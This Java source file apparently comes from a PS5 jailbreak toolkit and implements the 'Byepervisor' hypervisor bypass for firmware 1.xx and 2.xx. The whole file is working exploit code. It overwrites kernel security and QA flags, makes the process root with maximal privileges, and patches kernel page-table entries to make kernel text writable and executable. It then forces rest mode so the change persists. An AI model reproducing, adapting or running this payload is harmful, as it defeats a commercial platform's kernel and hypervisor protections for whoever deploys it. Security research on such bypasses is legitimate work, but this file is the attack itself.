package org.ps5jb.client.payloads;

import org.ps5jb.client.utils.process.ProcessUtils;
import org.ps5jb.loader.KernelAccessor;
import org.ps5jb.loader.KernelReadWrite;
import org.ps5jb.loader.Status;
import org.ps5jb.sdk.core.Pointer;
import org.ps5jb.sdk.core.SdkRuntimeException;
import org.ps5jb.sdk.core.kernel.KernelOffsets;
import org.ps5jb.sdk.core.kernel.KernelPointer;
import org.ps5jb.sdk.include.machine.PMap;
import org.ps5jb.sdk.include.machine.Param;
import org.ps5jb.sdk.include.machine.pmap.PhysicalMap;
import org.ps5jb.sdk.include.machine.pmap.PhysicalMapEntryMask;
import org.ps5jb.sdk.include.sys.errno.MemoryFaultException;
import org.ps5jb.sdk.include.sys.proc.Process;
import org.ps5jb.sdk.lib.LibKernel;

/**
 * Implementation of Byepervisor from Specter for PS5 firmware 1.xx and 2.xx.
 */
public class Byepervisor implements Runnable {
    private LibKernel libKernel;
    private KernelPointer kbaseAddress;
    private KernelOffsets offsets;

    @Override
    public void run() {
        // Don't continue if there is no kernel r/w
        KernelAccessor kernelAccessor = KernelReadWrite.getAccessor(getClass().getClassLoader());
        if (kernelAccessor == null) {
            Status.println("Unable to execute Byepervisor without kernel read/write capabilities");
            return;
        }

        libKernel = new LibKernel();
        try {
            // Byepervisor is only available before fw 3.xx

            int fw = libKernel.getSystemSoftwareVersion();
            if (fw >= 0x0300) {
                Status.println("Unable to execute Byepervisor on firmware version: " +
                        ((fw >> 8) & 0xFF) + "." + ((fw & 0xFF) < 10 ? "0" : "") + (fw & 0xFF));
                return;
            }

            // KASLR defeated?
            kbaseAddress = KernelPointer.valueOf(kernelAccessor.getKernelBase());
            if (KernelPointer.NULL.equals(kbaseAddress)) {
                Status.println("Kernel base address has not been determined. Aborting.");
                return;
            }

            // Get offsets for current firmware
            offsets = new KernelOffsets(fw);

            // Find current process
            ProcessUtils procUtils = new ProcessUtils(libKernel, kbaseAddress, offsets);
            Process curProc = procUtils.getCurrentProcess();
            if (curProc == null) {
                Status.println("Current process could not be found. Aborting.");
                return;
            }

            boolean alreadyApplied = checkRwFlag(false);

            // Revert security flags (for convenience), if patch is already applied.
            // Otherwise, set max security flags.
            KernelPointer securityFlagsAddress = kbaseAddress.inc(offsets.OFFSET_KERNEL_DATA + offsets.OFFSET_KERNEL_DATA_BASE_SECURITY_FLAGS);
            int origSecurityFlags = securityFlagsAddress.read4();
            int newSecurityFlags = alreadyApplied ? 0x03 : origSecurityFlags | 0x14;
            Status.println("Security flags: 0x" + Integer.toHexString(origSecurityFlags) + " => 0x" + Integer.toHexString(newSecurityFlags));
            securityFlagsAddress.write4(newSecurityFlags);

            // Revert QA flags (for convenience), if patch already applied.
            // Otherwise, set QA flags.
            KernelPointer qaFlagsAddress = kbaseAddress.inc(offsets.OFFSET_KERNEL_DATA + offsets.OFFSET_KERNEL_DATA_BASE_QA_FLAGS);
            int origQaFlags = qaFlagsAddress.read4();
            int newQaFlags = alreadyApplied ? 0x00 : origQaFlags | 0x10300;
            Status.println("QA flags: 0x" + Integer.toHexString(origQaFlags) + " => 0x" + Integer.toHexString(newQaFlags));
            qaFlagsAddress.write4(newQaFlags);

            if (alreadyApplied) {
                Status.println("Kernel base address is already readable. Aborting.");
                return;
            }

            // Become root
            int[] origIds = procUtils.setUserGroup(curProc, new int[] { 0, 0, 0, 1, 0 });

            // Relax process privileges
            long[] origPrivs = procUtils.setPrivs(curProc, new long[] {
                    0x4800000000000007L,
                    0xFFFFFFFFFFFFFFFFL, 0xFFFFFFFFFFFFFFFFL,
                    0x80
            });

            // Refresh dmap offsets
            KernelPointer pmap = kbaseAddress.inc(offsets.OFFSET_KERNEL_DATA + offsets.OFFSET_KERNEL_DATA_BASE_KERNEL_PMAP_STORE);
            PMap.refresh(pmap.inc(offsets.OFFSET_PMAP_STORE_DMPML4I), pmap.inc(offsets.OFFSET_PMAP_STORE_DMPDPI), pmap.inc(offsets.OFFSET_PMAP_STORE_PML4PML4I));

            // Enable RW on kernel text pages and disable XO
            Status.println("Enabling kernel text read/write...");
            enableKernelTextWrite();

            // Restore original privs and user (not really necessary since process will be killed on sleep anyway)
            procUtils.setUserGroup(curProc, origIds);
            procUtils.setPrivs(curProc, origPrivs);

            // Flag that RW is enabled after rest + resume
            checkRwFlag(true);

            // Put the system to rest (give user some time to read the message)
            Status.println("The process will now exit and the system will be put in rest mode shortly after.");
            Status.println("If this does not happen automatically, manually put the system to sleep.");
            Status.println("Upon resume, kernel text will be accessible after re-running the kernel read/write payload.");
            try {
                Thread.sleep(4000L);
            } catch (InterruptedException e) {
                // Ignore
            }
            enterRestMode();
        } finally {
            libKernel.closeLibrary();
        }
    }

    private void enableKernelTextWrite() {
        KernelPointer kdataAddress = kbaseAddress.inc(offsets.OFFSET_KERNEL_DATA);
        PhysicalMap pageMap = new PhysicalMap(kdataAddress.inc(offsets.OFFSET_KERNEL_DATA_BASE_KERNEL_PMAP_STORE));

        long pageCount = 0;
        long totalPageCount = (kdataAddress.addr() - kbaseAddress.addr()) / Param.PHYS_PAGE_SIZE;
        for (long addr = kbaseAddress.addr(); addr < kdataAddress.addr(); addr += Param.PHYS_PAGE_SIZE) {
            KernelPointer pdeAddress = PMap.pmap_pde(pageMap, addr);
            patchPageMapEntry(pdeAddress);

            KernelPointer pteAddress = PMap.pmap_pte(pageMap, addr);
            patchPageMapEntry(pteAddress);

            ++pageCount;

            if (pageCount % 0x100 == 0) {
                Status.println("Processed 0x" + Long.toHexString(pageCount) + " / 0x" + Long.toHexString(totalPageCount) + " pages");
            }
        }
    }

    private void patchPageMapEntry(KernelPointer dmapPtr) {
        if (!KernelPointer.NULL.equals(dmapPtr)) {
            try {
                long value = dmapPtr.read8();

                long newValue = clearPageTableEntry(value, PhysicalMapEntryMask.SCE_PG_XO);
                newValue = setPageTableEntry(newValue, PhysicalMapEntryMask.X86_PG_RW);
                if (value != newValue) {
                    dmapPtr.write8(newValue);
                }
            } catch (SdkRuntimeException e) {
                // Some pages cannot be read/written, it is expected
                if (!(e.getCause() instanceof MemoryFaultException)) {
                    throw e;
                }
            }
        }
    }

    private long clearPageTableEntry(long value, PhysicalMapEntryMask mask) {
        return value & ~mask.value();
    }

    private long setPageTableEntry(long value, PhysicalMapEntryMask mask) {
        return value | mask.value();
    }

    private boolean checkRwFlag(boolean flip) {
        KernelPointer kdataAddress = kbaseAddress.inc(offsets.OFFSET_KERNEL_DATA);
        boolean result = kdataAddress.read4(offsets.OFFSET_KERNEL_DATA_BASE_DATA_CAVE) == 0x00001337;
        if (!result && flip) {
            kdataAddress.write8(offsets.OFFSET_KERNEL_DATA_BASE_DATA_CAVE, 0xBD00000000001337L);
        }
        return result;
    }

    private void enterRestMode() {
        Pointer eventFlag = Pointer.calloc(8);
        try {
            if (libKernel.sceKernelOpenEventFlag(eventFlag, "SceSystemStateMgrStatus") == 0) {
                libKernel.sceKernelNotifySystemSuspendStart();
                libKernel.sceKernelSetEventFlag(eventFlag.read8(), 0x400);
                libKernel.sceKernelCloseEventFlag(eventFlag);
            }
        } finally {
            eventFlag.free();
        }
    }
}
